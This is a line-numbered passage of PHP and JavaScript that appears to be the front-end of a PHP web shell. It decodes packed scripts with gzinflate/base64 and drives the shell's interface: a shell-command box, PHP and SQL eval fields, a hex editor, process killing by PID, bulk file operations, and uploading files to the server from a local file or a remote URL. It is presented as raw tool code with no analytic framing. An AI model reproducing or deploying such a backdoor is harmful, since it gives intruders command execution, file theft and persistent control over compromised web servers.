2489 <?php echo gzinflate(base64_decode($s_sortable_js)).gzinflate(base64_decode($s_domready_js)); ?>
2490 &lt;/script&gt;
2491 &lt;script type='text/javascript'&gt;
2492 var d = document;
2493 var scroll = false;
2494 var cwd = '<?php echo adds($s_cwd); ?>';
2495 var hexstatus = false;
2496 var timer = '';
2497 
2498 domready(function(){
2499    <?php if(isset($_GP['cmd'])) echo "if(d.getElementById('cmd')) d.getElementById('cmd').focus();"; ?>
2500    <?php if(isset($_GP['evalcode'])) echo "if(d.getElementById('evalcode')) d.getElementById('evalcode').focus();"; ?>
2501    <?php if(isset($_GP['sqlcode'])) echo "if(d.getElementById('sqlcode')) d.getElementById('sqlcode').focus();"; ?>
2502    <?php if(isset($_GP['login'])) echo "if(d.getElementById('login')) d.getElementById('login').focus();"; ?>
2503    <?php if(isset($_GP['hexedit'])) echo "showhex();"; ?>
2504 
2505    if(d.getElementById('cmd')) d.getElementById('cmd').setAttribute('autocomplete', 'off');
2506 
2507    var textareas = d.getElementsByTagName('textarea');
2508    var count = textareas.length;
2509    for(i = 0; i&lt;count; i++){
2510        textareas[i].onkeydown = function(e){
2511            if(e.keyCode==9){
2512                e.preventDefault();
2513                var s = this.selectionStart;
2514                this.value = this.value.substring(0,this.selectionStart) + "\t" + this.value.substring(this.selectionEnd);
2515                this.selectionEnd = s+1;
2516            }
2517            else if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
2518                this.form.submit();
2519            }
2520        }
2521    }
2522    listen();
2523 });
2524 function is_array(var_to_tes){
2525    return (Object.prototype.toString.call(var_to_tes) === '[object Array]')? true:false;
2526 }
2527 function listen(){
2528    var x = d.getElementsByTagName("a");
2529    for(i = 0; i&lt;x.length; i++){
2530        if(x[i].addEventListener) x[i].addEventListener ("click", function(event){go(this.href,event);event.preventDefault();return false;},false);
2531        else x[i].attachEvent ("onclick", function(event){return go(this.href,event);event.preventDefault();return false;});
2532    }
2533 }
2534 function go(t,evt){
2535    if(evt.which === 3 || evt.button === 2) return false;
2536 
2537    var z = d.getElementsByName('g');
2538    if(z){
2539        var y = z.item(this);
2540        for(var i = 0; i&lt;y.length; i++){
2541            y[i].remove();
2542        }
2543    }
2544 
2545    t = decodeURI(t);
2546    ts = t.split('?');
2547 
2548    if(is_array(ts) && ts.length &gt;= 2){
2549        var a = ts[0]
2550        var v = ts[1];
2551 
2552        if(ts.length==3){
2553            a = ts[0]+'?'+ts[1]+'?';
2554            v = ts[2];
2555        }
2556 
2557        var vs = v.split('&');
2558        var g = d.forms['g'];
2559 
2560        if(a=='') a='?';
2561        g.action = a;
2562 
2563        if(is_array(vs)){
2564            for(var i = 0; i&lt;vs.length; i++){
2565                var e = vs[i].indexOf('=');
2566                if(e&gt;=0) addinput(g, vs[i].slice(0,e), vs[i].slice(e+1));
2567                else addinput(g, vs[0], '');
2568            }
2569        }
2570        else{
2571            var e = vs.indexOf('=');
2572            if(e&gt;=0) addinput(g, vs.slice(0,e), vs.slice(e+1));
2573            else addinput(g, vs, '');
2574        }
2575        g.submit();
2576    }
2577    else window.location = t;
2578    return false;
2579 }
2580 function tukar_(l,b){
2581    if(d.getElementById(l)) d.getElementById(l).style.display = 'none';
2582    if(d.getElementById(b)) d.getElementById(b).style.display = 'block';
2583    if(d.getElementById(l + '_')) d.getElementById(l + '_').focus();
2584 }
2585 function toggle(b){
2586    if(d.getElementById(b)){
2587        if(d.getElementById(b).style.display == 'block') d.getElementById(b).style.display = 'none';
2588        else d.getElementById(b).style.display = 'block'
2589    }
2590 }
2591 function tukar(id,cd,x,v,o){
2592    if(!o) o = '';
2593    a = d.getElementById(id);
2594    b = d.getElementById(id+'_form');
2595    c = '<?php echo adds($s_self); ?>';
2596    if(cd=='') cd = cwd;
2597    if(a && b){
2598        var i = d.createElement('form');
2599        i.action = c;
2600        i.method = 'post';
2601 
2602        if(o!='') addinput(i,'oldname',o);
2603 
2604        addinput(i,'cd',cd);
2605        addinput(i,x,v,'text','width:80px;','','inputz');
2606        addinput(i,'','Go !','submit','width:32px;','','inputzbut');
2607        addinput(i,'','x','button','',id,'inputzbut');
2608        b.appendChild(i);
2609        a.style.display = 'none';
2610    }
2611 }
2612 function addinput(f,n,v,t,s,c,cl){
2613    if(!t) t ='hidden';
2614    var i = d.createElement('input');
2615    if(n) i.name = n;
2616    if(v) i.value = v;
2617    if(t) i.type = t;
2618    if(s) i.style.cssText = s;
2619    if(c) i.onclick = function(){
2620        a = d.getElementById(c);
2621        b = d.getElementById(c+'_form');
2622        a.style.display = 'block';
2623        b.innerHTML = '';
2624    };
2625    if(cl) i.className = cl;
2626    f.appendChild(i);
2627 }
2628 function clickcmd(){
2629    var buff = d.getElementById('cmd');
2630    if(buff.value == '- shell command -') buff.value = '';
2631 }
2632 function download(what){
2633    what.form.submit();
2634    what.selectedIndex=0;
2635 }
2636 function hexfix(t,ev){
2637    var r = d.getElementById('hex_'+t);
2638    var q = d.getElementById('dump_'+t);
2639    var curpos = getcurpos(r);
2640 
2641    if(ev.keyCode==13 || ev.keyCode==46 || ev.keyCode==8 || ev.keyCode==32) return false;
2642 
2643    if(ev.keyCode==40){
2644        var s = d.getElementById('hex_'+(parseInt(t)+1));
2645        if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
2646        return false;
2647    }
2648    if(ev.keyCode==38){
2649        var s = d.getElementById('hex_'+(parseInt(t)-1));
2650        if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
2651        return false;
2652    }
2653 }
2654 function showhex(){
2655    var counter = parseInt(d.getElementById('counter').value);
2656    for(var i = 0; i&lt;counter; i++) hexupdate(i);
2657 }
2658 function hexupdate(t,ev){
2659    var r = d.getElementById('hex_'+t);
2660    var s = d.getElementById('dump_'+t);
2661    var a = '0123456789ABCDEF';
2662    var hexs = r.value;
2663    var hex = hexs.replace(/\s+/ig,'');
2664    var curpos = 0;
2665 
2666    clearpos();
2667 
2668    if(ev){
2669        curpos = getcurpos(r);
2670        var k = String.fromCharCode(ev.keyCode);
2671        if(curpos%3!=2){
2672            if(a.indexOf(k)&gt;=0 && curpos&lt;hexs.length){
2673                chr = hexs.substr(curpos,1);
2674                before = (curpos&gt;=1)?  hexs.substr(0,curpos):'';
2675                after = (curpos&lt;hexs.length)? hexs.substr(curpos+1):'';
2676                r.value = before + k + after;
2677                setcurpos(r, curpos+1, curpos+1);
2678            }
2679        }
2680    }
2681 
2682    if(r && s){
2683        var str = '';
2684        hexs = r.value;
2685        hex = hexs.replace(/\s+/ig,'');
2686        for(var i = 0; i&lt;hex.length; i+=2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
2687 
2688        str = str.replace(/[^\x21-\x7E]/ig,'.');
2689        str = str.replace(/&lt;/ig,'.');
2690        str = str.replace(/&gt;/ig,'.');
2691 
2692        dmppos = Math.floor(curpos/3);
2693        chr = str.substr(dmppos,1);
2694        before = (dmppos&gt;=1)? str.substr(0,dmppos):'';
2695        after = (dmppos&lt;str.length)? str.substr(dmppos+1):'';
2696        s.innerHTML = before + "&lt;span class='gaya' style='background:#000;font-weight:bold;border-bottom:1px solid #fff;border-top:1px solid #fff;'&gt;" + chr + "&lt;/span&gt;" + after;
2697    }
2698 }
2699 function submithex(){
2700    if(!hexstatus){
2701        hexstatus=true;
2702        var hexstr = '';
2703        var counter = parseInt(d.getElementById('counter').value);
2704        for(var i = 0; i&lt;counter; i++){
2705            var hex = d.getElementById('hex_'+i);
2706            hexstr += hex.value;
2707            hex.remove();
2708        }
2709        hexstr = hexstr.replace(/\s+/g,'');
2710        var hexestxtarea = d.getElementById('hexestxtarea');
2711        hexestxtarea.innerHTML = hexstr;
2712        hexestxtarea.form.submit();
2713    }
2714 }
2715 function evalselect(e){
2716    var a = d.getElementById('additionaloption');
2717    var b = d.getElementById('evaloption');
2718 
2719    if(a){
2720        if(e.value=='php') a.className='sembunyi';
2721        else a.className='';
2722        if(b) evaloption.value ='';
2723    }
2724 }
2725 function getcurpos(c){
2726     var p = 0;
2727 
2728     if(d.selection){
2729         c.focus ();
2730         var sel = d.selection.createRange();
2731         sel.moveStart ('character', c.value.length);
2732         p = sel.text.length;
2733     }
2734     else if(c.selectionStart || c.selectionStart == '0')
2735         p = c.selectionStart;
2736     return p;
2737 }
2738 function setcurpos(c,p1,p2){
2739    if(c.setSelectionRange){
2740        c.focus(); c.setSelectionRange(p1,p2);
2741    }
2742    else if(c.createTextRange){
2743        var r = c.createTextRange();
2744        r.collapse(true);
2745        r.moveStart('character', p1);
2746        r.moveEnd('character', p2);
2747        r.select();
2748    }
2749 }
2750 function clearpos(){
2751    var a = d.getElementsByName('hexdump');
2752    for(var i = 0; i&lt;a.length; i++)  a[i].innerHTML = a[i].innerHTML.replace(/&lt;[^&gt;]+&gt;/ig,'');
2753 }
2754 function findtype(ty){
2755    var z = d.getElementById('type');
2756    if(z && (ty=='sdir')) z.selectedIndex = 1;
2757    else if(z && (ty=='sfile')) z.selectedIndex = 0;
2758 }
2759 function checkall(){
2760    var a = d.getElementsByName('cbox');
2761    var b = d.getElementsByName('abox');
2762    var z = '<?php if(isset($_GP['x']) && ($_GP['x']=='ps')) echo "ps"; ?>';
2763 
2764    for(var i = 0; i&lt;a.length; i++){
2765        if(a[i].checked || (z=='ps') || (i!=0) && (i!=1)){
2766            a[i].checked = b[0].checked;
2767        }
2768        var c = a[i].parentElement.parentElement;
2769        if(a[i].checked) c.className = 'cbox_selected';
2770        else c.className = '';
2771    }
2772    total_selected();
2773 }
2774 function hilite(el){
2775    var c = el.parentElement.parentElement;
2776    if(el.checked) c.className = 'cbox_selected';
2777    else c.className = '';
2778    total_selected();
2779 }
2780 function total_selected(){
2781    var a = d.getElementsByName('cbox');
2782    var b = d.getElementById('total_selected');
2783    var c = 0;
2784    for(var i = 0;i&lt;a.length;i++)    if(a[i].checked) c++;
2785    if(c==0) b.innerHTML = '';
2786    else b.innerHTML = ' ( selected : '+c+' items )';
2787 }
2788 function massactgo(){
2789    var a = d.getElementsByName('cbox');
2790    var b = d.getElementById('massact');
2791    var c = d.getElementsByName('abox');
2792    var buffer = '';
2793 
2794    if(b.value=='cut' || b.value=='copy'){
2795        d.cookie='massact='+b.value+';';
2796        for(var i = 0; i&lt;a.length; i++) if(a[i].checked) buffer += a[i].value+'|';
2797        d.cookie='buffer='+escape(buffer);
2798    }
2799    else if(b.value=='paste'){
2800        addinput(b.form,'y','paste');
2801        b.form.submit();
2802    }
2803    else{
2804        for(var i = 0; i&lt;a.length; i++) if(a[i].checked) buffer += a[i].value+'|';
2805        d.cookie='buffer='+escape(buffer);
2806        addinput(b.form,'y', b.value);
2807        b.form.submit();
2808    }
2809    for(var i = 0; i&lt;a.length; i++){
2810        a[i].checked = false;
2811        a[i].parentElement.parentElement.className='';
2812    }
2813    c[0].checked = false;
2814 }
2815 function pkill(){
2816    var a = d.getElementsByName('cbox');
2817    var c = d.getElementsByName('abox');
2818    var buffer = '';
2819 
2820    for(var i = 0; i&lt;a.length; i++) if(a[i].checked) buffer += a[i].value+'|';
2821 
2822    if(buffer!=''){
2823        addinput(c[0].form,'x', 'ps');
2824        addinput(c[0].form,'pid', buffer);
2825        c[0].form.submit();
2826    }
2827 
2828    for(var i = 0; i&lt;a.length; i++){
2829        a[i].checked = false;
2830        a[i].parentElement.parentElement.className='';
2831    }
2832    c[0].checked = false;
2833 }
2834 function dc(id){
2835    d.cookie = dbcon[id] + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
2836 }
2837 function totop(){
2838    if(!scroll){
2839        var dur = window.pageYOffset;
2840        scroll = true;
2841        scrollto(0, dur);
2842    }
2843 }
2844 function totopd(){
2845    d.body.scrollTop = d.documentElement.scrollTop = 0;
2846    stopscroll();
2847 }
2848 function tobottom(){
2849    if(!scroll){
2850        var dur = getheight()-window.pageYOffset;
2851        scroll = true;
2852        scrollto(getheight(), dur);
2853    }
2854 }
2855 function tobottomd(){
2856    d.body.scrollTop = d.documentElement.scrollTop = getheight();
2857    stopscroll();
2858 }
2859 function stopscroll(){
2860    scroll = false;
2861    clearTimeout(timer);
2862 }
2863 function scrollto(to, dur) {
2864     var start = d.documentElement.scrollTop + d.body.scrollTop, change = to - start, cur = 0, inc = 20;
2865     var anim = function(){
2866        if(scroll){
2867            cur += inc;
2868            var val = easing(cur, start, change, dur);
2869            d.body.scrollTop = d.documentElement.scrollTop = val;
2870            if(cur &lt; dur) {
2871                if(scroll) timer = setTimeout(anim, inc);
2872            }
2873            else stopscroll();
2874        }
2875     };
2876     anim();
2877 }
2878 function easing(t,b,c,e){
2879    return -c * Math.cos(t/e * (Math.PI/2)) + c + b;
2880 }
2881 function getheight(){
2882    return Math.max(
2883        d.body.scrollHeight, d.documentElement.scrollHeight,
2884        d.body.offsetHeight, d.documentElement.offsetHeight,
2885        d.body.clientHeight, d.documentElement.clientHeight
2886    );
2887 }
2888 function adduploadc(){
2889    var form = "&lt;tr&gt;&lt;td colspan='2'&gt;&lt;hr /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style='width:140px;'&gt;File&lt;/td&gt;&lt;td&gt;&lt;input type='file' name='filepath[]' class='inputzbut' style='width:400px;margin:0;' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Save to&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefolder[]' value='"+cwd+"' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Filename (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefilename[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;";
2890    var a = d.getElementById('adduploadc');
2891    if(a) a.insertAdjacentHTML('beforeend', form);
2892 }
2893 function adduploadi(){
2894    var form = "&lt;tr&gt;&lt;td colspan='2'&gt;&lt;hr /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style='width:150px;'&gt;File URL&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='fileurl[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Save to&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefolderurl[]' value='"+cwd+"' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Filename (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefilenameurl[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;";
2895    var a = d.getElementById('adduploadi');
2896    if(a) a.insertAdjacentHTML('beforeend', form);
2897 }
2898 &lt;/script&gt;
2899 &lt;/body&gt;
